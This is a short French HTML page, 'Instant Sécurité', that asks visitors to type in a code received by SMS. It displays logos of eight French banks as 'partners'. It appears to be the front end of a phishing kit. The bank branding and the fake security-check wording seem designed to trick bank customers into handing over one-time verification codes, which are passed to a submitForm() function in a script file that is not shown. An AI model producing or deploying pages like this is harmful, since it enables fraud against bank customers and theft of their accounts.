<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instant Sécurité</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="script.js"></script>
  </head>
  <body>
    <div class="max-w-md mx-auto bg-white shadow-md rounded-lg mt-6 p-6">
      <!-- Title -->
      <div class="mt-6 text-center">
        <h1 class="text-xl font-semibold text-gray-900">
          Instant sécurité<span class="text-blue-500">.</span>
        </h1>
      </div>

      <!-- Instructions -->
      <div class="mt-4 text-center">
        <p class="text-sm text-gray-700">
          Saisissez le code présent dans votre SMS. Vous pouvez également
          re-cliquer sur le lien contenu dans votre message.
        </p>
      </div>

      <!-- Input Field -->
      <div class="mt-6">
        <label for="code" class="block text-sm text-gray-500"
          >Veuillez saisir le code reçu</label
        >
        <input
          type="text"
          id="code"
          placeholder="A1b2C3d4E5"
          class="mt-2 w-full border border-blue-300 rounded-lg px-4 py-2 text-gray-900 focus:ring-2 focus:ring-blue-400 focus:outline-none"
          required
        />
      </div>

      <!-- Button -->
      <div class="mt-6">
        <button
          onclick="submitForm()"
          class="bg-blue-500 text-white py-2 px-4 rounded-lg w-full"
        >
          CONTINUER
        </button>
      </div>

      <!-- Partners Section -->
      <div class="mt-6">
        <p class="text-center text-xs text-gray-400">Nos Partenaires</p>
        <div class="flex justify-center gap-2 mt-2">
          <img
            src="assets/p1.png"
            alt="Crédit Agricole"
            class="w-8 h-8 rounded-full"
          />
          <img
            src="assets/p2.jpg"
            alt="BNP Paribas"
            class="w-8 h-8 rounded-full"
          />
          <img
            src="assets/p3.png"
            alt="La Banque Postale"
            class="w-8 h-8 rounded-full"
          />
          <img
            src="assets/p5.png"
            alt="Société Générale"
            class="w-8 h-8 rounded-full"
          />
          <img src="assets/p6.jpg" alt="CIC" class="w-8 h-8 rounded-full" />
          <img src="assets/p7.png" alt="LCL" class="w-8 h-8 rounded-full" />
          <img
            src="assets/p8.png"
            alt="Caisse d'Épargne"
            class="w-8 h-8 rounded-full"
          />
          <img
            src="assets/p9.png"
            alt="Crédit Mutuel"
            class="w-8 h-8 rounded-full"
          />
        </div>
      </div>
    </div>
  </body>
</html>
